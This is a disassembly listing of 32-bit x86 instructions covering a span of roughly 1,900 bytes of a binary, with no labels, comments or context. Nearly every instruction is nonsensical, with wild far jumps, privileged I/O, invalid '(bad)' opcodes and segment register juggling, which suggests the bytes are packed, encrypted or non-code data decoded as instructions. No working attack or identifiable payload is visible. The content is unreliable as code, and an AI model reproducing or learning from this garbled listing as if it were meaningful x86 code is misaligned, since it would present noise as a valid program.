  4154f1:	sbb    DWORD PTR [esi+edi*4+0x5c],ebp
  4154f5:	sub    BYTE PTR [edx-0x5b],dh
  4154f8:	test   DWORD PTR [ecx],esi
  4154fa:	arpl   bp,cx
  4154fc:	ds jmp 0x25681b47
  415502:	arpl   WORD PTR [ebx-0x5e9cf6c3],di
  415508:	inc    edx
  415509:	sub    eax,0x17179b6d
  41550e:	mov    WORD PTR cs:[edx],ds
  415511:	sub    BYTE PTR [eax],al
  415513:	mov    edx,0xbc2aeaff
  415518:	pop    es
  415519:	jmp    0x415552
  41551b:	jmp    0xe9415e52
  415520:	sub    BYTE PTR gs:[edi+0x7c],al
  415524:	add    ch,BYTE PTR [eax]
  415526:	jb     0x415582
  415528:	sbb    BYTE PTR [ebx],ch
  41552a:	pop    edi
  41552b:	push   ebp
  41552c:	push   ss
  41552d:	cmp    DWORD PTR [edx+0x40],esi
  415530:	add    BYTE PTR [ebx+0x24],ah
  415533:	ins    BYTE PTR es:[edi],dx
  415534:	inc    esp
  415535:	push   eax
  415536:	sub    BYTE PTR [eax],al
  415538:	add    BYTE PTR [ebx],bh
  41553a:	cld    
  41553b:	push   ebx
  41553c:	arpl   dx,bp
  41553e:	xor    al,0x72
  415540:	imul   ecx,DWORD PTR [esi+0x0],0xfbef656c
  415547:	call   DWORD PTR [edx+0x2d]
  41554a:	inc    esi
  41554b:	push   0x60ea2661
  415550:	dec    esi
  415551:	aaa    
  415552:	fldenv [esi+eiz*2+0x41]
  415556:	xor    eax,0xfe5e6972
  41555b:	imul   esp,DWORD PTR [ebp+0x2f],0xfffffffc
  41555f:	call   DWORD PTR [edx+0x3d]
  415562:	inc    esi
  415563:	jb     0x4155ca
  415565:	cmp    ecx,ebx
  415567:	pusha  
  415568:	push   esp
  415569:	addr16 cld 
  41556b:	pusha  
  41556c:	outs   dx,BYTE PTR ds:[esi]
  41556d:	js     0x415544
  41556f:	fs jbe 0x415563
  415572:	repnz pusha 
  415574:	addr16 in eax,dx
  415576:	push   es
  415577:	dec    edi
  415578:	gs retf 0x5ee7
  41557c:	imul   ebx,ebp,0xffffffd6
  41557f:	dec    edi
  415580:	jb     0x415573
  415582:	fsub   DWORD PTR [esp+ebp*2-0x13]
  415586:	jmp    0xfbfc55eb
  41558b:	push   ecx
  41558c:	gs fwait
  41558e:	jmp    0x6972:0x36bd726a
  415595:	add    BYTE PTR [esi-0x509a9401],bh
  41559b:	sti    
  41559c:	call   DWORD PTR [edx-0x53]
  41559f:	fild   QWORD PTR [ebp+0x63]
  4155a2:	dec    edx
  4155a3:	sti    
  4155a4:	pop    esp
  4155a5:	jae    0x415554
  4155a7:	aaa    
  4155a8:	jno    0x415619
  4155aa:	pop    esp
  4155ab:	in     al,0x4f
  4155ad:	jb     0x415610
  4155af:	jmp    0x415615
  4155b1:	ins    BYTE PTR es:[edi],dx
  4155b2:	xor    DWORD PTR [ebp+0x1d],ecx
  4155b5:	arpl   WORD PTR [ecx],si
  4155b7:	fistp  WORD PTR [esi]
  4155b9:	aas    
  4155ba:	and    bl,bh
  4155bc:	sbb    ah,BYTE PTR [ebp+0x7]
  4155bf:	add    BYTE PTR [edx],dh
  4155c1:	addr16 sbb al,0x51
  4155c4:	xor    dh,BYTE PTR [edi-0x23]
  4155c7:	ficomp DWORD PTR [eax]
  4155c9:	arpl   WORD PTR [edi],cx
  4155cb:	loopne 0x4155fe
  4155cd:	addr16 (bad) 
  4155cf:	clc    
  4155d0:	pop    ss
  4155d1:	arpl   si,dx
  4155d3:	or     al,0x4
  4155d5:	add    BYTE PTR [ecx],al
  4155d7:	sti    
  4155d8:	push   eax
  4155d9:	push   esp
  4155da:	adc    ebp,ecx
  4155dc:	xor    ah,BYTE PTR [eax]
  4155de:	jmp    0x1e91a5d6
  4155e3:	popa   
  4155e4:	shr    DWORD PTR [edi],cl
  4155e6:	xor    al,0xa6
  4155e8:	cmp    DWORD PTR [ebp-0x3e],ebp
  4155eb:	mov    ebx,0xbf0c1fe7
  4155f0:	clc    
  4155f1:	or     DWORD PTR [eax-0x31],esi
  4155f4:	and    ah,BYTE PTR [ebx-0x5f]
  4155f7:	mov    ah,0xe7
  4155f9:	pop    ds
  4155fa:	add    BYTE PTR [ebx-0xd],cl
  4155fd:	(bad)  [edx]
  4155ff:	sub    esi,DWORD PTR [ecx+0x22]
  415602:	popa   
  415603:	xchg   esp,eax
  415604:	pusha  
  415605:	sub    eax,0x225a6c2b
  41560a:	ins    DWORD PTR es:[edi],dx
  41560b:	xchg   ebp,eax
  41560c:	jns    0x415621
  41560e:	gs cmp edx,eax
  415611:	sbb    al,0x64
  415613:	push   esp
  415614:	sub    BYTE PTR ds:0xd5795d67,0x1f
  41561b:	or     eax,edi
  41561d:	xor    al,0x3b
  41561f:	and    DWORD PTR [ebp-0x7da1bf09],ebp
  415625:	sub    eax,0xd8145763
  41562a:	dec    ebx
  41562b:	push   esp
  41562c:	or     DWORD PTR [ebp+0x1f],edx
  41562f:	cmp    eax,0x53e42131
  415634:	sub    eax,0x4638f95c
  415639:	ds push ss
  41563b:	(bad)  
  41563d:	dec    edx
  41563e:	xor    BYTE PTR [esi],cl
  415640:	sub    cl,BYTE PTR [ebp-0x16]
  415643:	cs es inc ebx
  415646:	pop    ss
  415647:	add    BYTE PTR [esp+ebx*8],ah
  41564a:	stc    
  41564b:	icebp  
  41564c:	sub    DWORD PTR ds:0x132b1230,edx
  415652:	fld    DWORD PTR [edx]
  415654:	and    BYTE PTR [edi],dl
  415656:	and    DWORD PTR [ebx],ebp
  415658:	jmp    0x2d228a64
  41565d:	adc    BYTE PTR [ebx],ah
  41565f:	add    dh,dh
  415661:	adc    al,0x10
  415663:	pop    ss
  415664:	fucomip st,st(1)
  415666:	add    eax,0xf323bd23
  41566b:	fadd   st,st(1)
  41566d:	adc    al,0xd9
  41566f:	and    dh,dl
  415671:	sub    ebp,esp
  415673:	stc    
  415674:	jno    0x41569e
  415676:	lds    ebp,FWORD PTR [edi]
  415678:	xchg   edx,eax
  415679:	daa    
  41567a:	rcr    eax,cl
  41567c:	jae    0x4156a5
  41567e:	retf   0x8d16
  415681:	and    cl,ch
  415683:	push   ds
  415684:	dec    ebx
  415685:	jmp    0x2ad87352
  41568a:	mov    ecx,0xbc032a2c
  41568f:	xor    dl,BYTE PTR [edx+0x5444cc1b]
  415695:	test   DWORD PTR cs:[edi],ebp
  415698:	sub    ebp,ecx
  41569a:	fwait
  41569b:	push   ss
  41569c:	pop    ebx
  41569d:	and    dl,BYTE PTR [ebx-0x4d1789e9]
  4156a3:	aad    0x1e
  4156a5:	jmp    0x265517a9
  4156aa:	imul   edi,DWORD PTR [ecx+0x15],0x1d
  4156ae:	addr16 dec ebx
  4156b0:	sbb    DWORD PTR [ecx+edi*1],ebp
  4156b3:	or     DWORD PTR [esi+0x3a],esp
  4156b6:	inc    edi
  4156b7:	sub    al,0x8d
  4156b9:	fld    TBYTE PTR ds:0x54f88819
  4156bf:	push   eax
  4156c0:	aas    
  4156c1:	sub    eax,0x4000366d
  4156c6:	jmp    0x3ad4801
  4156cb:	or     bl,ah
  4156cd:	js     0x415667
  4156cf:	inc    edx
  4156d0:	push   ss
  4156d1:	pop    ds
  4156d2:	sbb    eax,0xe4210f63
  4156d7:	dec    ebx
  4156d8:	or     al,0x3f
  4156da:	cs je  0x4156de
  4156dd:	dec    ebx
  4156de:	cwde   
  4156df:	dec    ecx
  4156e0:	push   ss
  4156e1:	adc    BYTE PTR [eax],bh
  4156e3:	je     0x4156f5
  4156e5:	and    al,0x27
  4156e7:	cmp    ch,cl
  4156e9:	add    eax,0x5fc9544c
  4156ee:	sbb    DWORD PTR [eax],esp
  4156f0:	mov    cl,0xe6
  4156f2:	cmp    al,0x50
  4156f4:	push   cs
  4156f5:	and    ah,dh
  4156f7:	das    
  4156f8:	in     al,0x28
  4156fa:	push   eax
  4156fb:	ins    DWORD PTR es:[edi],dx
  4156fc:	fimul  DWORD PTR [esi-0x2d]
  4156ff:	pop    ds
  415700:	or     al,0x60
  415702:	add    al,0xa
  415704:	test   al,0x51
  415706:	sub    ah,BYTE PTR [ebx-0x47]
  415709:	push   esi
  41570a:	rcr    DWORD PTR [edi],cl
  41570c:	add    esp,esp
  41570e:	loope  0x41571a
  415710:	repz jae 0x41573d
  415713:	popa   
  415714:	test   BYTE PTR [edx],ah
  415716:	sbb    eax,0x2a3cac2b
  41571b:	ins    DWORD PTR es:[edi],dx
  41571c:	test   DWORD PTR [ebx],edi
  41571e:	daa    
  41571f:	gs add dl,dh
  415722:	stos   DWORD PTR es:[edi],eax
  415723:	data16 fs mov ch,0xfd
  415727:	jae    0x415792
  415729:	add    BYTE PTR [ebx+eiz*8+0x2b],al
  41572d:	and    dl,dh
  41572f:	mov    al,ds:0xa0183d6e
  415734:	pop    es
  415735:	inc    ebx
  415736:	(bad)  
  415737:	(bad)  
  415738:	ins    DWORD PTR es:[edi],dx
  415739:	gs sti 
  41573b:	fsub   DWORD PTR [edi+ebp*2+0x5e]
  41573f:	mov    ds:0xfdfc631d,eax
  415744:	outs   dx,BYTE PTR ds:[esi]
  415745:	gs popf 
  415747:	xchg   ecx,eax
  415748:	push   edx
  415749:	jae    0x415740
  41574b:	fisubr DWORD PTR [eax]
  41574d:	inc    ecx
  41574e:	div    edi
  415750:	ins    DWORD PTR es:[edi],dx
  415751:	je     0x4156e5
  415753:	stos   DWORD PTR es:[edi],eax
  415754:	dec    edx
  415755:	outs   dx,DWORD PTR ds:[esi]
  415756:	adc    dh,ah
  415758:	imul   ebp,DWORD PTR [ecx+edi*1-0x42],0x31
  41575d:	cs js  0x41570b
  415760:	and    eax,0x70003f63
  415765:	popa   
  415766:	inc    esp
  415767:	repnz popa 
  415769:	ins    BYTE PTR es:[edi],dx
  41576a:	xor    eax,0x1b4d1da2
  41576f:	aam    0x40
  415771:	and    BYTE PTR ds:0x383b2dbf,dl
  415777:	inc    esp
  415778:	outs   dx,BYTE PTR gs:[esi]
  41577a:	hlt    
  41577b:	std    
  41577c:	jb     0x4157f1
  41577e:	sub    BYTE PTR [edx-0x6ee2d6cb],ah
  415784:	or     cl,BYTE PTR [edx]
  415786:	sbb    BYTE PTR [ebp+0xd2e2dfd],bh
  41578c:	pop    esp
  41578d:	sub    al,BYTE PTR [eax]
  41578f:	(bad)  
  415790:	mov    al,0xfd
  415792:	sub    esi,ebx
  415794:	mov    al,0xfd
  415796:	inc    edi
  415797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415798:	rol    DWORD PTR [ebx+0x0],cl
  41579b:	xor    DWORD PTR [ebx-0x22],edi
  41579e:	das    
  41579f:	sbb    DWORD PTR [eax-0x2a],ebx
  4157a2:	and    ah,BYTE PTR [ecx]
  4157a4:	push   esp
  4157a5:	dec    ecx
  4157a6:	sub    edx,DWORD PTR [eax+edx*2]
  4157a9:	in     eax,dx
  4157aa:	push   edi
  4157ab:	adc    al,0xc5
  4157ad:	icebp  
  4157ae:	xor    DWORD PTR [ecx-0x33],ebx
  4157b1:	icebp  
  4157b2:	xor    DWORD PTR [ecx-0x3],ebx
  4157b5:	out    0x2f,al
  4157b7:	arpl   WORD PTR [eax-0x19],cx
  4157ba:	das    
  4157bb:	arpl   ax,bx
  4157bd:	out    0x2f,al
  4157bf:	arpl   ax,bx
  4157c1:	out    0x2f,al
  4157c3:	arpl   ax,bp
  4157c5:	out    0x2f,al
  4157c7:	inc    ebx
  4157c8:	call   0xf88487b3
  4157cd:	push   ds
  4157ce:	add    dh,dh
  4157d0:	dec    esp
  4157d1:	sbb    BYTE PTR [esi+0x10],cl
  4157d4:	hlt    
  4157d5:	sub    dh,BYTE PTR [esi-0x2c]
  4157d8:	rcr    BYTE PTR [edx],cl
  4157da:	jno    0x4157b9
  4157dc:	add    al,0x2f
  4157de:	inc    edi
  4157df:	iret   
  4157e0:	or     eax,0x4ca0031
  4157e5:	push   ss
  4157e6:	outs   dx,BYTE PTR ds:[esi]
  4157e7:	aam    0x3
  4157e9:	aad    0x31
  4157eb:	pop    ss
  4157ec:	add    al,0x30
  4157ee:	ins    BYTE PTR es:[edi],dx
  4157ef:	xor    ecx,ebp
  4157f1:	adc    al,0x55
  4157f3:	add    dh,al
  4157f5:	mov    dh,0xd7
  4157f7:	xor    eax,DWORD PTR [ecx-0x739ecd4e]
  4157fd:	mov    bl,0x16
  4157ff:	add    BYTE PTR [edx-0x618bd8a9],al
  415805:	rcl    DWORD PTR [ebx],0x63
  415808:	ins    DWORD PTR es:[edi],dx
  415809:	outs   dx,BYTE PTR ds:[esi]
  41580a:	and    al,0x72
  41580c:	gs jo  0x41583c
  41580f:	jae    0x4157a7
  415811:	leave  
  415812:	das    
  415813:	jno    0x41586a
  415815:	or     DWORD PTR [ebp-0x50ca7ec9],ebp
  41581b:	xor    ah,BYTE PTR [eax+0x1d]
  41581e:	call   0x5c17:0x85268003
  415825:	sub    BYTE PTR [ecx+0x28],bh
  415828:	ins    DWORD PTR es:[edi],dx
  415829:	dec    edi
  41582a:	mov    BYTE PTR ds:0x2f973503,dl
  415830:	inc    edx
  415831:	xor    BYTE PTR cs:[ecx],0x40
  415835:	xor    eax,0x3501382d
  41583a:	das    
  41583b:	xor    esp,DWORD PTR [eax]
  41583d:	sbb    eax,0x2600045a
  415842:	inc    ebp
  415843:	sbb    BYTE PTR [eax+ebp*1],bl
  415846:	cmp    DWORD PTR [ecx],ebp
  415848:	in     eax,dx
  415849:	dec    esi
  41584a:	dec    eax
  41584b:	push   ss
  41584c:	push   ecx
  41584d:	inc    esp
  41584e:	dec    eax
  41584f:	xor    bl,dh
  415851:	sub    eax,0x38d51644
  415856:	adc    ebx,DWORD PTR [ecx]
  415858:	add    ah,dl
  41585a:	pop    ds
  41585b:	or     eax,0x3b4f0517
  415860:	xor    al,0xfd
  415862:	inc    eax
  415863:	(bad)  
  415864:	push   ss
  415865:	fstp   QWORD PTR [ecx]
  415867:	out    0x36,eax
  415869:	fsubr  QWORD PTR [esi]
  41586b:	repz sbb ah,dh
  41586e:	sbb    cl,BYTE PTR [eax+eax*2]
  415871:	mul    DWORD PTR [edi]
  415873:	stc    
  415874:	aas    
  415875:	loopne 0x41589e
  415877:	(bad)  [eax]
  415879:	xchg   ebp,eax
  41587a:	dec    ebp
  41587b:	shl    BYTE PTR [edx*4-0x69b431dc],1
  415882:	sbb    bl,dl
  415884:	xor    ah,BYTE PTR [ebx+0x6549a312]
  41588a:	cmp    DWORD PTR [edi+0x1d8032],ebp
  415890:	jmp    0xb5a77edc
  415895:	sbb    esi,DWORD PTR [edx+esi*2]
  415898:	mov    WORD PTR [esi],gs
  41589a:	dec    ebx
  41589b:	pop    edi
  41589c:	fwait
  41589d:	cld    
  41589e:	xor    BYTE PTR [ecx-0x78],dl
  4158a1:	cmp    BYTE PTR [eax],ch
  4158a3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4158a5:	add    eax,0x1b966c34
  4158aa:	inc    ecx
  4158ab:	addr16 jp 0x4158cc
  4158ae:	es jb  0x415921
  4158b1:	dec    BYTE PTR [edx+0x54]
  4158b4:	cdq    
  4158b5:	push   0x26
  4158b7:	jno    0x415916
  4158b9:	xor    eax,0x476d3a
  4158be:	dec    ecx
  4158bf:	push   ds
  4158c0:	pop    edi
  4158c1:	pop    ebx
  4158c2:	push   esi
  4158c3:	xor    eax,0xe93f4846
  4158c8:	dec    edx
  4158c9:	dec    eax
  4158ca:	inc    ebx
  4158cb:	xor    al,0x65
  4158cd:	inc    esp
  4158ce:	pop    ds
  4158cf:	xor    eax,0x281b4851
  4158d4:	fs and eax,0x166c344a
  4158da:	sbb    BYTE PTR [ecx+0x67],al
  4158dd:	sbb    cl,BYTE PTR [ecx+0x26]
  4158e0:	jb     0x4158f2
  4158e2:	icebp  
  4158e3:	dec    edx
  4158e4:	push   esp
  4158e5:	cmp    ebp,esp
  4158e7:	and    eax,0x3932fd71
  4158ec:	pop    edi
  4158ed:	cli    
  4158ee:	sbb    eax,0x16fb6d1e
  4158f3:	or     DWORD PTR [eax-0x2],ecx
  4158f6:	sbb    eax,0x5fc84e1d
  4158fb:	sub    BYTE PTR [eax],al
  4158fd:	mov    ah,0x3d
  4158ff:	sub    BYTE PTR [edx-0x17],dh
  415902:	outs   dx,BYTE PTR ds:[esi]
  415903:	sub    al,0x6e
  415905:	les    esi,FWORD PTR [edx]
  415907:	push   ds
  415908:	popa   
  415909:	add    al,dh
  41590b:	dec    eax
  41590c:	data16 je 0x4158d7
  41590f:	cdq    
  415910:	data16 outs dx,BYTE PTR ds:[esi]
  415912:	icebp  
  415913:	pop    es
  415914:	pop    esp
  415915:	inc    edi
  415916:	sar    BYTE PTR [esi],1
  415918:	dec    edi
  415919:	dec    esp
  41591a:	popf   
  41591b:	(bad)  
  41591d:	dec    eax
  41591e:	mov    dh,0xfc
  415920:	jae    0x415983
  415922:	add    BYTE PTR [ebx+eiz*8+0x7ba6943],dh
  415929:	inc    esi
  41592a:	je     0x415974
  41592c:	aas    
  41592d:	outs   dx,BYTE PTR ds:[esi]
  41592e:	imul   edx,DWORD PTR [esi-0x379a971a],0x3c666adc
  415938:	icebp  
  415939:	pop    esp
  41593a:	jb     0x415939
  41593c:	dec    eax
  41593d:	inc    ebx
  41593e:	push   0x656bfe01
  415943:	cli    
  415944:	dec    eax
  415945:	push   ebx
  415946:	imul   edx,DWORD PTR [esi-0x1f],0xad4b776a
  41594d:	inc    eax
  41594e:	outs   dx,DWORD PTR ds:[esi]
  41594f:	cmc    
  415950:	jecxz  0x4159ae
  415952:	outs   dx,BYTE PTR ds:[esi]
  415953:	in     al,dx
  415954:	jmp    0x4159c7
  415956:	add    BYTE PTR [ebx],bl
  415958:	fisub  DWORD PTR [ebp+0x74]
  41595b:	dec    edi
  41595c:	call   0x4265bed2
  415961:	push   0x60d93b69
  415966:	jb     0x41596c
  415968:	shr    DWORD PTR [edx+0x74],1
  41596b:	cmp    ecx,ebx
  41596d:	pop    ds
  41596e:	inc    ebx
  41596f:	aaa    
  415970:	in     al,0x68
  415972:	popa   
  415973:	ss loope 0x4159d6
  415976:	jb     0x4159c0
  415978:	rol    DWORD PTR [eax+esi*2+0xb],cl
  41597c:	bnd fs je 0x41597b
  415980:	fdivp  st(7),st
  415982:	push   edx
  415983:	xor    ecx,ecx
  415985:	adc    eax,0x64a20063
  41598a:	add    DWORD PTR [eax+edi*2+0x50],ebx
  41598e:	adc    al,0x75
  415990:	cwde   
  415991:	pop    esp
  415992:	and    al,0x68
  415994:	pop    ebp
  415995:	jae    0x4159cb
  415997:	pop    ebp
  415998:	outs   dx,DWORD PTR ds:[esi]
  415999:	jl     0x4159cc
  41599b:	add    BYTE PTR [ebp+0x176e2a73],cl
  4159a1:	jns    0x4159d2
  4159a3:	addr16 xor edx,ecx
  4159a6:	sub    ch,BYTE PTR [esi+0x48]
  4159a9:	mov    al,ds:0x626e5138
  4159ae:	xor    eax,0x4a6c3150
  4159b3:	push   edx
  4159b4:	xor    DWORD PTR [esi+eax*2+0x46],esp
  4159b8:	ins    DWORD PTR es:[edi],dx
  4159b9:	imul   esi,DWORD PTR [ebx],0x37d4f200
  4159bf:	inc    ebx
  4159c0:	out    dx,eax
  4159c1:	(bad)  [ebx]
  4159c3:	add    BYTE PTR [eax],al
  4159c5:	fisttp WORD PTR [ebx+0x67]
  4159c8:	and    bh,BYTE PTR [ebp*1+0x32a00872]
  4159cf:	ins    DWORD PTR es:[edi],dx
  4159d0:	paddusb mm2,QWORD PTR [edi+ebx*2]
  4159d4:	add    eax,DWORD PTR [ebp+0x40]
  4159d7:	inc    ebp
  4159d8:	add    eax,0xdd5f21d3
  4159dd:	into   
  4159de:	inc    eax
  4159df:	aas    
  4159e0:	add    ebp,ebp
  4159e2:	aas    
  4159e3:	inc    ecx
  4159e4:	in     al,0xf3
  4159e6:	es inc esi
  4159e8:	std    
  4159e9:	iret   
  4159ea:	jecxz  0x415a21
  4159ec:	add    BYTE PTR [ecx],dl
  4159ee:	fsubr  DWORD PTR [ebx+ebp*2]
  4159f1:	int3   
  4159f2:	repz xor al,BYTE PTR [ecx-0x1b]
  4159f6:	or     ch,BYTE PTR ds:0x1200d36c
  4159fc:	add    BYTE PTR [edx-0x62da29f7],al
  415a02:	sbb    cl,al
  415a04:	adc    DWORD PTR [edx-0x7bd051cb],edx
  415a0a:	daa    
  415a0b:	enter  0x602f,0x46
  415a0f:	test   al,0x33
  415a11:	jb     0x415a48
  415a13:	stos   BYTE PTR es:[edi],al
  415a14:	sbb    BYTE PTR [ebp+0x6137ad2c],al
  415a1a:	jmp    0x17c03e13
  415a1f:	xchg   esi,eax
  415a20:	and    eax,0x2c9a1652
  415a25:	dec    esp
  415a26:	and    ecx,DWORD PTR [eax-0x55c78ad1]
  415a2c:	aaa    
  415a2d:	pop    esp
  415a2e:	and    dl,BYTE PTR [ebx-0x18e899df]
  415a34:	xor    cl,BYTE PTR [ebx+ebp*1+0x7b]
  415a38:	push   ss
  415a39:	push   esi
  415a3a:	pop    ss
  415a3b:	test   BYTE PTR [edi],bh
  415a3d:	hlt    
  415a3e:	and    al,0x56
  415a40:	and    al,BYTE PTR [esi]
  415a42:	and    eax,0x395e433a
  415a47:	sub    al,0x40
  415a49:	lock sbb edx,DWORD PTR [ebx+0x29]
  415a4d:	idiv   DWORD PTR [edi+edx*1]
  415a50:	in     al,0x0
  415a52:	cmp    eax,0xa2f2ee9
  415a57:	sub    al,0x13
  415a59:	xor    eax,0x2f3e3cf0
  415a5e:	frstor [esi]
  415a60:	or     BYTE PTR [edx],dl
  415a62:	xor    DWORD PTR [esi],esi
  415a64:	push   cs
  415a65:	es in  eax,0x19
  415a68:	or     BYTE PTR [edx],dl
  415a6a:	shl    BYTE PTR [esi+eiz*1],cl
  415a6d:	xor    ah,bl
  415a6f:	or     BYTE PTR es:[eax],dh
  415a72:	loopne 0x415ab9
  415a74:	sub    BYTE PTR [edx+esi*8],dh
  415a77:	xor    al,0x0
  415a79:	sub    bl,BYTE PTR [eax]
  415a7b:	sbb    eax,0x39692763
  415a80:	and    BYTE PTR [esi],bl
  415a82:	or     eax,0x54ce7241
  415a87:	sub    al,0x71
  415a89:	fiadd  DWORD PTR [ebp+0x1e]
  415a8c:	outs   dx,BYTE PTR ds:[esi]
  415a8d:	enter  0x2d5e,0x4f
  415a91:	stos   BYTE PTR es:[edi],al
  415a92:	ds push ds
  415a94:	ins    DWORD PTR es:[edi],dx
  415a95:	int    0x50
  415a97:	xor    BYTE PTR [edx-0x17],dh
  415a9a:	inc    ebx
  415a9b:	push   ds
  415a9c:	data16 mov ch,0x47
  415a9f:	xor    BYTE PTR [edx-0x74],dh
  415aa2:	es inc esi
  415aa4:	ins    BYTE PTR es:[edi],dx
  415aa5:	mov    ss,WORD PTR [eax]
  415aa7:	xor    BYTE PTR [edx+edi*4+0x73],ch
  415aab:	ror    BYTE PTR [edi-0x5c],1
  415aae:	push   cs
  415aaf:	dec    edx
  415ab0:	jae    0x415b2f
  415ab2:	sbb    DWORD PTR [edi+0x54],eax
  415ab5:	cdq    
  415ab6:	add    dl,dl
  415ab8:	fcomp  DWORD PTR [edi]
  415aba:	mov    eax,ds:0x8d632407
  415abf:	gs dec edx
  415ac1:	push   esp
  415ac2:	push   esi
  415ac3:	push   esp
  415ac4:	sbb    eax,0x9434862
  415ac9:	push   ecx
  415aca:	inc    esi
  415acb:	dec    edi
  415acc:	adc    eax,0x2c234875
  415ad1:	pop    esp
  415ad2:	cs inc ecx
  415ad4:	push   ds
  415ad5:	bound  ecx,QWORD PTR [eax+0x41]
  415ad8:	cmp    al,BYTE PTR [ecx+0x28]
  415adb:	cmp    eax,0x462a5c4c
  415ae0:	adc    eax,0x39292f63
  415ae5:	and    cl,ah
  415ae7:	push   edx
  415ae8:	inc    eax
  415ae9:	jb     0x415af1
  415aeb:	cvttps2pi mm6,QWORD PTR [ecx+0x1a]
  415aef:	sbb    bl,BYTE PTR [esi]
  415af1:	outs   dx,BYTE PTR ds:[esi]
  415af2:	add    BYTE PTR [ecx],bh
  415af4:	fstp   DWORD PTR [ebx+0x51]
  415af7:	or     edx,ecx
  415af9:	push   0x6f
  415afb:	sub    al,0xeb
  415afd:	pop    esp
  415afe:	jb     0x415b18
  415b00:	rol    BYTE PTR [edx+0x6c],1
  415b03:	(bad)  
  415b04:	jmp    0x491cc765
  415b09:	cmp    eax,0x3ecfc550
  415b0e:	jne    0x415af4
  415b10:	out    0x45,al
  415b12:	push   esp
  415b13:	test   al,0xb
  415b15:	pop    esp
  415b16:	inc    edi
  415b17:	in     al,dx
  415b18:	fsub   QWORD PTR [ecx+0x61]
  415b1b:	add    ah,ch
  415b1d:	fdivr  DWORD PTR [esi]
  415b1f:	inc    ecx
  415b20:	enter  0x5c46,0x43
  415b24:	(bad)
  415b27:	inc    esi
  415b28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b29:	fistp  DWORD PTR [edi]
  415b2b:	push   eax
  415b2c:	mov    edx,0x975bffdc
  415b31:	fild   QWORD PTR [edx+0x62]
  415b34:	mov    ecx,0x89434edf
  415b39:	fild   DWORD PTR [eax+0x5c]
  415b3c:	mov    esi,esi
  415b3e:	jae    0x415ba5
  415b40:	(bad)  
  415b41:	xlat   BYTE PTR ds:[ebx]
  415b42:	dec    edi
  415b43:	and    BYTE PTR [esp+eiz*8+0x73],bl
  415b47:	gs mov bh,cl
  415b4a:	ds jne 0x415b41
  415b4d:	out    0x45,eax
  415b4f:	push   esp
  415b50:	dec    eax
  415b51:	add    eax,0x9edd735c
  415b56:	popa   
  415b57:	popa   
  415b58:	inc    esp
  415b59:	add    eax,0xf0e66f4f
  415b5e:	jb     0x415bc1
  415b60:	sub    ch,al
  415b62:	pop    ebx
  415b63:	inc    esi
  415b64:	cmp    al,0xec
  415b66:	outs   dx,BYTE PTR ds:[esi]
  415b67:	push   0x5c4fcd16
  415b6c:	xor    DWORD PTR [ebx+0x7de5101],esi
  415b72:	sbb    BYTE PTR [ebp-0x30],dh
  415b75:	xchg   ebx,eax
  415b76:	es pop esp
  415b78:	idiv   ebp
  415b7a:	and    BYTE PTR [ecx-0x37],dh
  415b7d:	fistp  QWORD PTR [ebx]
  415b7f:	push   eax
  415b80:	add    BYTE PTR [ecx],dh
  415b82:	repz sub ah,BYTE PTR [esi-0x63]
  415b86:	scas   eax,DWORD PTR es:[edi]
  415b87:	and    dh,BYTE PTR [edx-0x6c]
  415b8a:	dec    esp
  415b8b:	inc    ebx
  415b8c:	ins    BYTE PTR es:[edi],dx
  415b8d:	nop
  415b8e:	mov    bl,0x29
  415b90:	inc    esi
  415b91:	imul   edx,DWORD PTR [eax+0x3d],0x2b593134
  415b98:	jno    0x415b1f
  415b9a:	shr    DWORD PTR ds:0x45528c6c,0x5f
  415ba1:	gs enter 0x5f31,0x5d
  415ba6:	js     0x415ba9
  415ba8:	jo     0x415bfa
  415baa:	je     0x415bd5
  415bac:	add    BYTE PTR [eax-0x7a],ch
  415baf:	adc    BYTE PTR [eax+edx*2+0xc],dh
  415bb3:	sub    eax,0x15816120
  415bb8:	push   0x74226431
  415bbd:	push   eax
  415bbe:	pop    esi
  415bbf:	sub    al,0x6c
  415bc1:	adc    eax,0x5000f85
  415bc6:	shr    DWORD PTR [edx],cl
  415bc8:	je     0x415bde
  415bca:	xor    ebp,edx
  415bcc:	arpl   WORD PTR [eax],dx
  415bce:	sub    al,0x4
  415bd0:	pop    esp
  415bd1:	loopne 0x415c07
  415bd3:	sub    esp,DWORD PTR [ecx+0x1a]
  415bd6:	neg    BYTE PTR [edi]
  415bd8:	pop    edi
  415bd9:	add    eax,0x84835a0
  415bde:	ror    DWORD PTR [edi],cl
  415be0:	ins    DWORD PTR es:[edi],dx
  415be1:	jecxz  0x415bbb
  415be3:	jmp    0x9115c4b
  415be8:	sbb    eax,DWORD PTR [edi*8-0x1fdaf4ba]
  415bef:	and    BYTE PTR ds:0xda2ce13c,ch
  415bf5:	add    esp,ebp
  415bf7:	inc    esi
  415bf8:	adc    esp,DWORD PTR ds:0x3c2520c0
  415bfe:	loope  0x415c2c
  415c00:	mov    ebx,0x478d03
  415c05:	sub    BYTE PTR [edx-0x72d82fcd],dl
  415c0b:	sub    bh,ah
  415c0d:	aaa    
  415c0e:	mov    al,ds:0x9a20db20
  415c13:	sub    BYTE PTR [ebp-0x46db73dc],bh
  415c19:	jmp    0x40c78a4
  415c1e:	push   ebp
  415c1f:	sbb    ecx,esp
  415c21:	es push edx
  415c23:	pop    ds
  415c24:	mov    bl,0x16
  415c26:	push   edx
  415c27:	sbb    ebx,DWORD PTR [ebp-0x32e59ce0]
  415c2d:	sbb    ecx,DWORD PTR [edx+0x1d]
  415c30:	out    0x37,eax
  415c32:	push   edi
  415c33:	and    BYTE PTR [ebx+0x20],bh
  415c36:	dec    ebx
  415c37:	and    BYTE PTR [ebx+0x7edf5e27],dl
  415c3d:	sub    BYTE PTR [ebp+0x9],al
  415c40:	call   0x2324:0x7615172a
  415c47:	and    al,0x43
  415c49:	inc    edx
  415c4a:	add    BYTE PTR [esi],dl
  415c4c:	sbb    eax,0x1d0e3e44
  415c51:	inc    ebx
  415c52:	and    eax,0x223e3a31
  415c57:	std    
  415c58:	adc    eax,0x2d121648
  415c5d:	and    eax,0x24052d
  415c62:	adc    ebx,DWORD PTR [ebx*1+0x484d486c]
  415c69:	ins    BYTE PTR es:[edi],dx
  415c6a:	adc    BYTE PTR [eax],dl
  415c6c:	pop    ds
  415c6d:	je     0x415c58
  415c6f:	in     eax,0x1e
  415c71:	jno    0x415c90
  415c73:	adc    al,0x1d
  415c75:	ins    BYTE PTR es:[edi],dx
  415c76:	cs icebp 
  415c78:	and    eax,0x1beae972
